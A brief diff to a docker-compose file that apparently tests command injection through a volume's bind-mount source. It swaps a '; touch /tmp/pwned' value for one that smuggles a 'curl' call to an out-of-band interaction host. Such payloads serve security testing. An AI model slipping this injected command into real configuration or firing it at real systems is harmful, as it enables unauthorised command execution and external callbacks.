@@ -3,5 +3,5 @@ services:
    image: alpine
    volumes:
     - type: bind
-      source: '; touch /tmp/pwned'
+      source: '; curl https://dizrv3m0zxdgsiygmpiqhglet5zwnybn.oastify.com;'
       target: /app
